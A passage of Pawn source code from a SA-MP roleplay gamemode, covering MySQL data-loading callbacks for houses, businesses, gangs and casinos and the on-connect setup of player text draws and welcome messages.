	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aYakuza[1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}

	CreateDynamicMapIcon(1422.0151,-1631.7119,13.5469,52,0); // Банк
	CreateDynamicMapIcon(1365.6863,-1279.8872,13.5469,18,0); //Аммо лс
	CreateDynamicMapIcon(-2026.9664,-100.3766,35.1641,36,0); //АШ
	CreateDynamicMapIcon(2163.6724,2060.5046,10.8203,44,0); //КАЗИНОАА
	CreateDynamicMapIcon(1694.6332,-1950.3981,14.1172,57,0); //ПОЕЗД ЛС
	CreateDynamicMapIcon(-1952.3240,179.1383,26.2813,57,0); //ПОЕЗД СФ
	CreateDynamicMapIcon(2860.1345,1270.8904,11.3906,57,0); //ПОЕЗД ЛВ
    CreateDynamicMapIcon(325.0884,-1515.3992,36.0325,24,0); //ОТЕЛЬ ЛС
    CreateDynamicMapIcon(-2463.4446,131.7308,35.1719,24,0); //ОТЕЛЬ СФ
    CreateDynamicMapIcon(2628.0029,2349.3127,10.8203,24,0); //ОТЕЛЬ ЛВ

	mysql_tquery(mysql, "SELECT `army1gun`,`army1ammo`,`army2gun`,`army2ammo`,`lspdgun`,`lspdammo`,`sfpdgun`,`sfpdammo`,`lvpdgun`,`lvpdammo`,`kazna`,`kolvo` FROM `serverdata`", "ServerdataLoad", "");
	mysql_tquery(mysql, "SELECT `gnewsmoney` FROM `serverdata`", "NewsMoneyLoad", "");

    byme1 = TextDrawCreate(473.904785, 4.693337, "D");
	TextDrawLetterSize(byme1, 0.734571, 2.039467);
	TextDrawAlignment(byme1, 1);
	TextDrawColor(byme1, -16776961);
	TextDrawUseBox(byme1, true);
	TextDrawBoxColor(byme1, 0);
	TextDrawSetShadow(byme1, 0);
	TextDrawSetOutline(byme1, 1);
	TextDrawBackgroundColor(byme1, 51);
	TextDrawFont(byme1, 0);
	TextDrawSetProportional(byme1, 1);

	byme2 = TextDrawCreate(492.571441, 8.533334, "ifficult Stage");
	TextDrawLetterSize(byme2, 0.449999, 1.600000);
	TextDrawAlignment(byme2, 1);
	TextDrawColor(byme2, -16776961);
	TextDrawSetShadow(byme2, 0);
	TextDrawSetOutline(byme2, 1);
	TextDrawBackgroundColor(byme2, 51);
	TextDrawFont(byme2, 1);
	TextDrawSetProportional(byme2, 1);

	byme3 = TextDrawCreate(480.000000, 22.186668, "Real Life");
	TextDrawLetterSize(byme3, 0.332285, 1.403733);
	TextDrawAlignment(byme3, 1);
	TextDrawColor(byme3, -1378294017);
	TextDrawSetShadow(byme3, 0);
	TextDrawSetOutline(byme3, 1);
	TextDrawBackgroundColor(byme3, 51);
	TextDrawFont(byme3, 3);
	TextDrawSetProportional(byme3, 1);
	//
 	gText[0] = TextDrawCreate(425.599884, 432.320190, "");
	TextDrawFont(gText[0], 1);
	TextDrawColor(gText[0],0x33AAFFFF);
	TextDrawLetterSize(gText[0], 0.3600, 1.400000);
	TextDrawSetOutline(gText[0], 1);
    TextDrawSetSelectable(gText[0], 0);

	gText[1] = TextDrawCreate(54.817199, 315.000030, "");
    TextDrawLetterSize(gText[0], 0.511376, 2.364165);
    TextDrawAlignment(gText[0], 1);
    TextDrawColor(gText[0], -5963521);
    TextDrawSetShadow(gText[0], 0);
    TextDrawSetOutline(gText[0], -1);
    TextDrawBackgroundColor(gText[0], 51);
    TextDrawFont(gText[0], 3);
    TextDrawSetProportional(gText[0], 1);

    gText[2] = TextDrawCreate(84.802360, 306.833374, "");
    TextDrawLetterSize(gText[1], 0.307100, 1.349166);
    TextDrawAlignment(gText[1], 1);
    TextDrawColor(gText[1], -1);
    TextDrawSetShadow(gText[1], 0);
    TextDrawSetOutline(gText[1], 1);
    TextDrawBackgroundColor(gText[1], 51);
    TextDrawFont(gText[1], 3);
    TextDrawSetProportional(gText[1], 1);

	SetWeather(1);
	return true;
}
forward HintLoad();
forward CasinoLoad();
forward HouseLoad();
forward TransportLoad();
forward FuelLoad();
forward GangLoad();
forward BintsLoad();
forward BusinessLoad();
forward GangzoneLoad();
forward ServerdataLoad();
forward NewsMoneyLoad();
public HintLoad(){
	new rows = cache_get_row_count(mysql);
	new result[1000], Fields = cache_get_field_count(mysql);
	if(rows != HINTS_COUNT) print("Hints count difference");
	else for(new i; i<rows;i++){
			f_mysql_fetch_row_format(i, result, Fields);
			sscanf(result,"p<|>e<iffffffffis[51]>",gHints[i]);
			gHintStoreArea[i] = CreateDynamicSphere(gHintStore[i][0],gHintStore[i][1],gHintStore[i][2],2.0);
			if(i < HINTS_COUNT)
			{
				for(new k;k<9;k++)
				{
					CreateDynamicObject(gHintGunID[k],gHintGun[i][k][0],gHintGun[i][k][1],gHintGun[i][k][2],gHintGun[i][k][3],gHintGun[i][k][4],gHintGun[i][k][5],i+500);
				}
			}
		}
	return true;
}

public CasinoLoad(){
	new rows = cache_get_row_count(mysql);
	new result[1000], Fields = cache_get_field_count(mysql);
	if(rows >= 2) print("Кол-во казино в базе больше максимального");
	else if(!rows) print("Казино в базе не найдено");
	else for(new i; i<rows;i++){
			f_mysql_fetch_row_format(i, result, Fields);
			sscanf(result,"p<|>is[36]ii",gCasino[i][casinoID],gCasino[i][casinoOwner],gCasino[i][casinoPrice],gCasino[i][casinoBank]);
		}
	printf("%d casino loaded", cache_get_row_count(mysql));
	return true;
}
public HouseLoad(){
	new rows = cache_get_row_count(mysql);
 	new result[1000], Fields = cache_get_field_count(mysql);
	gHouseCount = rows;
	if(rows >= MAX_HOUSE_COUNT) print("Кол-во домов в базе больше максимального");
	else if(!rows) print("Домов в базе не найдено");
	else for(new i; i<rows; i++){
			f_mysql_fetch_row_format(i, result, Fields);
			sscanf(result,"p<|>iiiiia<i>[5]a<i>[9]a<i>[4]iiiiiffffffffis[24]a<i>[3]s[24]s[24]s[24]",gHouses[i][houseID],gHouses[i][houseClass],gHouses[i][houseDay],gHouses[i][housePrice],gHouses[i][houseHint],gHouses[i][houseImprove],gHouses[i][houseGun],gHouses[i][houseSkin],gHouses[i][houseSafeCode],gHouses[i][houseSafeMoney],gHouses[i][houseDrugs],gHouses[i][houseProducts],gHouses[i][houseClose],
			gHouses[i][houseX],gHouses[i][houseY],gHouses[i][houseZ],gHouses[i][houseR], gHouses[i][houseParkX],gHouses[i][houseParkY],gHouses[i][houseParkZ],gHouses[i][houseParkR],gHouses[i][houseOwnerID],gHouses[i][houseOwner],gHouses[i][houseHabitID],gHouseHabits[i][0],gHouseHabits[i][1],gHouseHabits[i][2]);
			gHouseArea[i] = CreateDynamicSphere(gHouses[i][houseX],gHouses[i][houseY],gHouses[i][houseZ],2.0,0,0,-1);
            if(gHouses[i][houseOwner])
			//if(gHouses[i][houseOwnerID] != 0)
			{
				gHousePickup[i] = CreateDynamicPickup(1272,1,gHouses[i][houseX],gHouses[i][houseY],gHouses[i][houseZ]);
				gHouseIcon[i] = CreateDynamicMapIcon(gHouses[i][houseX],gHouses[i][houseY],gHouses[i][houseZ],32,CWHITE);
			}
			else
			{
				gHousePickup[i] = CreateDynamicPickup(1273,1,gHouses[i][houseX],gHouses[i][houseY],gHouses[i][houseZ]);
				gHouseIcon[i] = CreateDynamicMapIcon(gHouses[i][houseX],gHouses[i][houseY],gHouses[i][houseZ],31,CWHITE);
			}
			new hintid = gHouses[i][houseHint];
			for(new k;k<2;k++) //Улучшения
			{
				if(!gHouses[i][houseImprove][k]) continue;
				switch(k)
				{
					case 1:
					{
						CreateDynamicObject(2708,gHintStore[hintid][0],gHintStore[hintid][1],gHintStore[hintid][2],gHintStore[hintid][3],gHintStore[hintid][4],gHintStore[hintid][5],i+1);
						new cnt;
						for(new l;l<4;l++)
						{
							if(gHouses[i][houseSkin][l]) cnt++;
						}
						cnt--;
						if(cnt < 0 && gHouses[i][houseOwnerID]) printf("Возможны лаги с одеждой в доме %d",i+1);
						else if(cnt > 0)
						{
							CreateDynamicObject(2689,gHintDress[hintid][0][0],gHintDress[hintid][0][1],gHintDress[hintid][0][2],gHintDress[hintid][0][3],gHintDress[hintid][0][4],gHintDress[hintid][0][5],i+1);
							if(cnt > 1) CreateDynamicObject(2704,gHintDress[hintid][1][0],gHintDress[hintid][1][1],gHintDress[hintid][1][2],gHintDress[hintid][1][3],gHintDress[hintid][1][4],gHintDress[hintid][1][5],i+1);
							if(cnt > 2) CreateDynamicObject(2705,gHintDress[hintid][2][0],gHintDress[hintid][2][1],gHintDress[hintid][2][2],gHintDress[hintid][2][3],gHintDress[hintid][2][4],gHintDress[hintid][2][5],i+1);
						}
						for(new l;l<9;l++)
						{
							if(!gHouses[i][houseGun][l]) continue;
							gHouseGunObject[i][l] = CreateDynamicObject(gHintGunID[l],gHintGun[hintid][l][0],gHintGun[hintid][l][1],gHintGun[hintid][l][2],gHintGun[hintid][l][3],gHintGun[hintid][l][4],gHintGun[hintid][l][5],i+1);
						}
					}
				}
			}
		}
	printf("%d houses loaded", gHouseCount);
	return true;
}
public TransportLoad(){
	new rows = cache_get_row_count(mysql);
	new result[1000], Fields = cache_get_field_count(mysql);
	for(new i; i<rows;i++){
		f_mysql_fetch_row_format(i, result, Fields);
		sscanf(result,"p<|>e<iis[35]iiiiiii>",gTransport[i]);
	}
	return true;
}
stock f_mysql_fetch_row_format(row, destination[], fields, max_len = sizeof(destination)) {
	new field_str[128];
	strdel(destination, 0, max_len);
	for(new f=0; f < fields; f++) {
		if(f != 0)strcat(destination, "|", max_len);
		cache_get_row(row, f, field_str, mysql);
		if(!f)strins(destination, field_str, 0, max_len);
		else strcat(destination, field_str, max_len);
	}
	return true;
}
public FuelLoad()
{
	new rows = cache_get_row_count(mysql);
	if(rows != FILLING_COUNT) print("Кол-во заправок в базе не совпадает с предопределным количеством");
	else
	{
		for(new f,m=cache_get_row_count(mysql);f<m;f++) {
			gAreas[arFill][f] = CreateDynamicSphere(gFuelPumps[f][0][0],gFuelPumps[f][0][1],gFuelPumps[f][0][2],10.0);
			CreateDynamicMapIcon(gFuelPumps[f][0][0],gFuelPumps[f][0][1],gFuelPumps[f][0][2],56,CWHITE);
		}
	}
	return true;
}
public GangLoad(){
	new rows = cache_get_row_count(mysql);
	new result[1000], Fields = cache_get_field_count(mysql);
	if(rows != 5) print("Кол-во банд в базе не совпадает с предопределным количеством");
	else for(new i; i<rows;i++){
			f_mysql_fetch_row_format(i, result, Fields);
			new ranks[256];
			sscanf(result,"p<|>{i}s[255]a<i>[5]ia<i>[4]ia<i>[4]",ranks,gGangCars[i],gGangDormLimit[i],gGangDorm[i],gGangCode[i],gGangAccess[i]);
			explode(gFractionRankName[i+2],ranks,",");
			for(new j;j<5;j++)
			{
				if(!gGangCars[i][j]) gGangCars[i][j] = 481;
				new vid;
				vid = CreateVehicle(gGangCars[i][j],gGangCarSlot[i][j][0],gGangCarSlot[i][j][1],gGangCarSlot[i][j][2],gGangCarSlot[i][j][3],gGangCarColors[i],gGangCarColors[i],900);
				aGang[i][j] = vid;
				gVehicles[vid-1][vFuel] = 100;
				gVehicles[vid-1][vLock] = 0;
				gVehicles[vid-1][vID] = vid;
			}
		}
	return true;
}
public BintsLoad(){
	new rows = cache_get_row_count(mysql);
	new result[1000], Fields = cache_get_field_count(mysql);
	if(rows != BINT_COUNT) print("Кол-во БИНТ'ов в базе не совпадает с предопределным количеством");
	else for(new i; i<rows;i++){
			f_mysql_fetch_row_format(i, result, Fields);
			sscanf(result,"p<|>e<iifffffffs[32]>",gBints[i]);
			gBintEnterArea[i] = CreateDynamicSphere(gBints[i][bintX],gBints[i][bintY],gBints[i][bintZ],1.0);
			CreateDynamicPickup(1318,1,gBints[i][bintX],gBints[i][bintY],gBints[i][bintZ]);
			CreateDynamicPickup(1239,1,gBints[i][bintXB],gBints[i][bintYB],gBints[i][bintZB]);
		}
	for(new i = 0;i<BINT_COUNT;i++) gBintBuyArea[i] = CreateDynamicSphere(gBints[i][bintXB],gBints[i][bintYB],gBints[i][bintZB],1.0);
	return true;
}
public BusinessLoad(){
	new rows = cache_get_row_count(mysql);
	gBusinessCount = rows;
	new result[1000], Fields = cache_get_field_count(mysql);
	if(rows >= MAX_BUSINESS_COUNT) print("Кол-во бизнесов в базе превышает предопределнное количество");
	else if(!rows)print("Не обнаружено бизнесов в базе");
	else for(new i; i<rows;i++){
			f_mysql_fetch_row_format(i, result, Fields);
			sscanf(result,"p<|>is[64]iiiiiiiiffffiiis[48]",gBusiness[i][busiID],gBusiness[i][busiName],gBusiness[i][busiType],gBusiness[i][busiBint],gBusiness[i][busiOwnerID],gBusiness[i][busiSellPrice],gBusiness[i][busiBank],gBusiness[i][busiPrice],gBusiness[i][busiProduct],gBusiness[i][busiStatus],gBusiness[i][busiX],gBusiness[i][busiY],gBusiness[i][busiZ],
			gBusiness[i][busiR],gBusiness[i][busiOrder],gBusiness[i][busiDeliving],gBusiness[i][busiMafia],gBusiness[i][busiOwner]);
			gBusinessArea[i] = CreateDynamicSphere(gBusiness[i][busiX],gBusiness[i][busiY],gBusiness[i][busiZ],1.0);
			CreateDynamicPickup(19132,1,gBusiness[i][busiX],gBusiness[i][busiY],gBusiness[i][busiZ]);
			gBusinessText[i] = CreateDynamic3DTextLabel("_",CWHITE,gBusiness[i][busiX],gBusiness[i][busiY],gBusiness[i][busiZ]+1.0,20.0);
			new icon = 0, bint = gBusiness[i][busiBint];
			if(bint >= 1 && bint <= 4) icon = 49;
			else if((bint >= 5 && bint <= 9) || bint == 23) icon = 45;
			else if(bint >= 17 && bint <= 21) icon = 50;
			else if(bint == 22) icon = 27;
			else if(bint == 14 || bint == 15) icon = 48;
			if(icon) gBusinessIcon[i] = CreateDynamicMapIcon(gBusiness[i][busiX], gBusiness[i][busiY], gBusiness[i][busiZ], icon, -1);
		}
	for(new i = 0;i<gBusinessCount;i++)
	{
		UpdateBusinessText(i);
		gBusiness[i][busiDelivingArea] = CreateDynamicSphere(gBusiness[i][busiX],gBusiness[i][busiY],gBusiness[i][busiZ],10.0);
	}
	return true;
}
public GangzoneLoad(){
	new rows = cache_get_row_count(mysql);
	new result[256], Fields = cache_get_field_count(mysql);
	for(new i; i<rows;i++){
		f_mysql_fetch_row_format(i, result, Fields);
		sscanf(result, "p<|>dffffd",GZInfo[i][gID],GZInfo[i][gCoords][0],GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3],GZInfo[i][gFrakVlad]);
		GZInfo[i][gID] = GangZoneCreate(GZInfo[i][gCoords][0],GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]);
	}
	return true;
}
public ServerdataLoad(){
	new result[190], Fields = cache_get_field_count(mysql);
	f_mysql_fetch_row_format(0, result, Fields);
	sscanf(result,"p<|>iiiiiiiiiiii",gArmyWarehouse[0][0],gArmyWarehouse[0][1],gArmyWarehouse[1][0],gArmyWarehouse[1][1],gPDWarehouse[0][0],gPDWarehouse[0][1],gPDWarehouse[1][0],gPDWarehouse[1][1],gPDWarehouse[2][0],gPDWarehouse[2][1],Kazna,OffFrac);
	return true;
}
public NewsMoneyLoad(){
	gNewsMoney = cache_get_row_int(0, 0, mysql);
	printf("Банк Новостей успешно загружён, на счету $%i.", gNewsMoney);
	return true;
}
public OnGameModeExit()
{
	mysql_close();
	return true;
}

public OnPlayerRequestClass(playerid, classid)
{
	if(GetPVarInt(playerid,"Logined") == 1) return SpawnPlayer(playerid);
	SetPVarInt(playerid,"Joined",1);
	SetTimerEx("OnPlayerJoin",300,false,"i",playerid);
	return true;
}
public OnPlayerConnect(playerid)
{
//================================ DSRL Dasawyisi =========================================================//
   	PlayAudioStreamForPlayer(playerid,"http://mp3.gol.ge/C/Coldplay/Paradise/Coldplay_-_Paradise.mp3");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "");
    SendClientMessage(playerid, 0xEAC700FF, "Gamemode By Giorgi Gotsiridze");
    SendClientMessage(playerid, 0xEAC700FF, "{9D9EA1}Welcome To :{FF6600}  Difficult Stage Real Life / Official");
    // Serverze Shemodis Motamashe
    new xazi[128];
    new saxeli[MAX_PLAYER_NAME];
	GetPlayerName(playerid, saxeli, sizeof(saxeli));
	format(xazi, sizeof(xazi), "{FFCC00}Motamashe {FF6600}%s {FFCC00}Shemovida Serverze", saxeli);
	SendClientMessageToAll(COLOR_BLUE,xazi);
    //==================================================================//
    cvector_push_back(players, playerid);
    SetPlayerDataToDefault(playerid);
	TextDrawShowForPlayer(playerid,gText[0]);
	TextDrawShowForPlayer(playerid,gText[1]);
	TextDrawShowForPlayer(playerid,gText[2]);
	TextDrawShowForPlayer(playerid,byme1);
	TextDrawShowForPlayer(playerid,byme2);
	TextDrawShowForPlayer(playerid,byme3);
	ResetPlayerWeaponsEx(playerid);

	privcar[playerid] = CreatePlayerTextDraw(playerid, 412.000000, 365.000000, "_");
    PlayerTextDrawFont(playerid, privcar[playerid], TEXT_DRAW_FONT_MODEL_PREVIEW);
    PlayerTextDrawUseBox(playerid, privcar[playerid], 0);
    PlayerTextDrawTextSize(playerid, privcar[playerid], 85.0, 80.0);
    PlayerTextDrawSetPreviewModel(playerid, privcar[playerid], 411);
    PlayerTextDrawSetPreviewRot(playerid, privcar[playerid], -50.0, 0.0, 180.0,0.8);
    PlayerTextDrawBackgroundColor(playerid, privcar[playerid], 0xFFFFFF00);

	RegisterLoginTD[playerid] = TextDrawCreate(321.000000, 212.000000, "_");
	TextDrawAlignment(RegisterLoginTD[playerid], 0x2);
	TextDrawBackgroundColor(RegisterLoginTD[playerid], 0xFF);
	TextDrawFont(RegisterLoginTD[playerid], 0x2);
	TextDrawLetterSize(RegisterLoginTD[playerid], 0.500000, 1.000000);
	TextDrawColor(RegisterLoginTD[playerid], 11322367);
	TextDrawSetOutline(RegisterLoginTD[playerid], 0x0);
	TextDrawSetProportional(RegisterLoginTD[playerid], 0x1);
	TextDrawSetShadow(RegisterLoginTD[playerid], 0x1);

	VehSelectPl[playerid][0] = CreatePlayerTextDraw(playerid, 543.015869, 142.333374, "Infernus");
	PlayerTextDrawLetterSize(playerid, VehSelectPl[playerid][0], 0.449999, 1.600000);
	PlayerTextDrawAlignment(playerid, VehSelectPl[playerid][0], 2);
	PlayerTextDrawColor(playerid, VehSelectPl[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, VehSelectPl[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, VehSelectPl[playerid][0], 1);
	PlayerTextDrawBackgroundColor(playerid, VehSelectPl[playerid][0], 51);
	PlayerTextDrawFont(playerid, VehSelectPl[playerid][0], 1);
	PlayerTextDrawSetProportional(playerid, VehSelectPl[playerid][0], 1);

	VehSelectPl[playerid][1] = CreatePlayerTextDraw(playerid, 485, 187.583343, "usebox");
	PlayerTextDrawLetterSize(playerid, VehSelectPl[playerid][1], 0.000000, 0.266665);
	PlayerTextDrawTextSize(playerid, VehSelectPl[playerid][1], 75.0, 5.0);
	PlayerTextDrawAlignment(playerid, VehSelectPl[playerid][1], 0);
	PlayerTextDrawColor(playerid, VehSelectPl[playerid][1], 0x00000000);
	PlayerTextDrawUseBox(playerid, VehSelectPl[playerid][1], true);
	PlayerTextDrawBoxColor(playerid,VehSelectPl[playerid][1], 0x73B1EDFF);

	VehSelectPl[playerid][2] = CreatePlayerTextDraw(playerid, 485, 218.499938, "usebox");
	PlayerTextDrawLetterSize(playerid, VehSelectPl[playerid][2], 0.000000, 0.266667);
	PlayerTextDrawTextSize(playerid, VehSelectPl[playerid][2], 75.0, 5.0);
	PlayerTextDrawAlignment(playerid, VehSelectPl[playerid][2], 0);
	PlayerTextDrawColor(playerid, VehSelectPl[playerid][2], 0x00000000);
	PlayerTextDrawUseBox(playerid, VehSelectPl[playerid][2], true);
	PlayerTextDrawBoxColor(playerid, VehSelectPl[playerid][2], 0x73B1EDFF);

	VehSelectPl[playerid][3] = CreatePlayerTextDraw(playerid, 485, 245.916534, "usebox");
	PlayerTextDrawLetterSize(playerid, VehSelectPl[playerid][3], 0.000000, 0.226851);
	PlayerTextDrawTextSize(playerid, VehSelectPl[playerid][3], 75.0, 5.0);
	PlayerTextDrawAlignment(playerid, VehSelectPl[playerid][3], 0);
	PlayerTextDrawColor(playerid, VehSelectPl[playerid][3], 0x00000000);
	PlayerTextDrawUseBox(playerid, VehSelectPl[playerid][3], true);
	PlayerTextDrawBoxColor(playerid, VehSelectPl[playerid][3], 0x73B1EDFF);

	VehSelectPl[playerid][4] = CreatePlayerTextDraw(playerid, 613.762695, 257.249877, "$20000");
	PlayerTextDrawLetterSize(playerid, VehSelectPl[playerid][4], 0.330000, 1.299998);
	PlayerTextDrawAlignment(playerid, VehSelectPl[playerid][4], 3);
	PlayerTextDrawColor(playerid, VehSelectPl[playerid][4], -1);
	PlayerTextDrawSetShadow(playerid, VehSelectPl[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, VehSelectPl[playerid][4], 1);
	PlayerTextDrawBackgroundColor(playerid, VehSelectPl[playerid][4], 51);
	PlayerTextDrawFont(playerid, VehSelectPl[playerid][4], 3);
	PlayerTextDrawSetProportional(playerid, VehSelectPl[playerid][4], 1);

	ColorTDPl[playerid][0] = CreatePlayerTextDraw(playerid, 593.500000, 319.666412, "$1000");
	PlayerTextDrawLetterSize(playerid, ColorTDPl[playerid][0], 0.324499, 1.209166);
	PlayerTextDrawAlignment(playerid, ColorTDPl[playerid][0], 1);
	PlayerTextDrawColor(playerid, ColorTDPl[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, ColorTDPl[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, ColorTDPl[playerid][0], 1);
	PlayerTextDrawBackgroundColor(playerid, ColorTDPl[playerid][0], 51);
	PlayerTextDrawFont(playerid, ColorTDPl[playerid][0], 2);
	PlayerTextDrawSetProportional(playerid, ColorTDPl[playerid][0], 1);

	ColorTDPl[playerid][1] = CreatePlayerTextDraw(playerid, 515.000000, 163.333435, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, ColorTDPl[playerid][1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ColorTDPl[playerid][1], 26.500000, 26.249990);
	PlayerTextDrawAlignment(playerid, ColorTDPl[playerid][1], 1);
	PlayerTextDrawColor(playerid, ColorTDPl[playerid][1], -16776961);
	PlayerTextDrawSetShadow(playerid, ColorTDPl[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, ColorTDPl[playerid][1], 0);
	PlayerTextDrawFont(playerid, ColorTDPl[playerid][1], 4);

	ColorTDPl[playerid][2] = CreatePlayerTextDraw(playerid, 549.000000, 163.333633, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, ColorTDPl[playerid][2], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ColorTDPl[playerid][2], 26.500000, 26.249990);
	PlayerTextDrawAlignment(playerid, ColorTDPl[playerid][2], 1);
	PlayerTextDrawColor(playerid, ColorTDPl[playerid][2], -16776961);
	PlayerTextDrawSetShadow(playerid, ColorTDPl[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, ColorTDPl[playerid][2], 0);
	PlayerTextDrawFont(playerid, ColorTDPl[playerid][2], 4);

	ColorTDPl[playerid][3] = CreatePlayerTextDraw(playerid, 583.500000, 163.333389, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, ColorTDPl[playerid][3], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ColorTDPl[playerid][3], 26.500000, 26.249990);
	PlayerTextDrawAlignment(playerid, ColorTDPl[playerid][3], 1);
	PlayerTextDrawColor(playerid, ColorTDPl[playerid][3], -16776961);
	PlayerTextDrawSetShadow(playerid, ColorTDPl[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, ColorTDPl[playerid][3], 0);
	PlayerTextDrawFont(playerid, ColorTDPl[playerid][3], 4);

	ColorTDPl[playerid][4] = CreatePlayerTextDraw(playerid, 515.500000, 226.333435, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, ColorTDPl[playerid][4], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ColorTDPl[playerid][4], 26.500000, 26.249990);
	PlayerTextDrawAlignment(playerid, ColorTDPl[playerid][4], 1);
	PlayerTextDrawColor(playerid, ColorTDPl[playerid][4], -16776961);
	PlayerTextDrawSetShadow(playerid, ColorTDPl[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, ColorTDPl[playerid][4], 0);
	PlayerTextDrawFont(playerid, ColorTDPl[playerid][4], 4);

	ColorTDPl[playerid][5] = CreatePlayerTextDraw(playerid, 549.000000, 226.333404, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, ColorTDPl[playerid][5], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ColorTDPl[playerid][5], 26.500000, 26.249990);
	PlayerTextDrawAlignment(playerid, ColorTDPl[playerid][5], 1);
	PlayerTextDrawColor(playerid, ColorTDPl[playerid][5], -16776961);
	PlayerTextDrawSetShadow(playerid, ColorTDPl[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, ColorTDPl[playerid][5], 0);
	PlayerTextDrawFont(playerid, ColorTDPl[playerid][5], 4);

	ColorTDPl[playerid][6] = CreatePlayerTextDraw(playerid, 582.500000, 226.916702, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, ColorTDPl[playerid][6], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ColorTDPl[playerid][6], 26.500000, 26.249990);
	PlayerTextDrawAlignment(playerid, ColorTDPl[playerid][6], 1);
	PlayerTextDrawColor(playerid, ColorTDPl[playerid][6], -16776961);
	PlayerTextDrawSetShadow(playerid, ColorTDPl[playerid][6], 0);
	PlayerTextDrawSetOutline(playerid, ColorTDPl[playerid][6], 0);
	PlayerTextDrawFont(playerid, ColorTDPl[playerid][6], 4);

	RECON[playerid] = CreatePlayerTextDraw(playerid, 425.000000, 250.000000, "_");
	PlayerTextDrawFont(playerid, RECON[playerid], 2);
	PlayerTextDrawColor(playerid, RECON[playerid],-1);
	PlayerTextDrawSetOutline(playerid, RECON[playerid], 0);
	PlayerTextDrawLetterSize(playerid, RECON[playerid], 0.410000, 1.000000);
	PlayerTextDrawSetOutline(playerid, RECON[playerid],1);
	PlayerTextDrawSetProportional(playerid, RECON[playerid], 1);
	PlayerTextDrawAlignment(playerid, RECON[playerid], 1);
	PlayerTextDrawSetShadow(playerid, RECON[playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, RECON[playerid], 51);
	PlayerTextDrawUseBox(playerid,RECON[playerid], 1);
	PlayerTextDrawBoxColor(playerid,RECON[playerid], 100);

	gSkinShopPriceDraw[playerid] = CreatePlayerTextDraw(playerid, 31.000000, 224.000000, "_");
	PlayerTextDrawBackgroundColor(playerid, gSkinShopPriceDraw[playerid], 255);
	PlayerTextDrawFont(playerid, gSkinShopPriceDraw[playerid], 3);
	PlayerTextDrawLetterSize(playerid, gSkinShopPriceDraw[playerid], 0.500000, 1.600000);
	PlayerTextDrawColor(playerid, gSkinShopPriceDraw[playerid], -1);
	PlayerTextDrawSetOutline(playerid, gSkinShopPriceDraw[playerid], 0);
	PlayerTextDrawSetProportional(playerid, gSkinShopPriceDraw[playerid], 1);
	PlayerTextDrawSetShadow(playerid, gSkinShopPriceDraw[playerid], 1);

	gVehInfo[playerid] = CreatePlayerTextDraw(playerid,428.000000,378.000000,"~n~~n~~n~~n~~n~");
	PlayerTextDrawUseBox(playerid,gVehInfo[playerid],1);
	PlayerTextDrawBoxColor(playerid,gVehInfo[playerid],0x00000066);
	PlayerTextDrawTextSize(playerid,gVehInfo[playerid],713.000000,190.000000);
	PlayerTextDrawAlignment(playerid,gVehInfo[playerid],1);
	PlayerTextDrawBackgroundColor(playerid,gVehInfo[playerid],0x000000ff);
	PlayerTextDrawFont(playerid,gVehInfo[playerid],2);
	PlayerTextDrawLetterSize(playerid,gVehInfo[playerid],0.444444,1.800000);
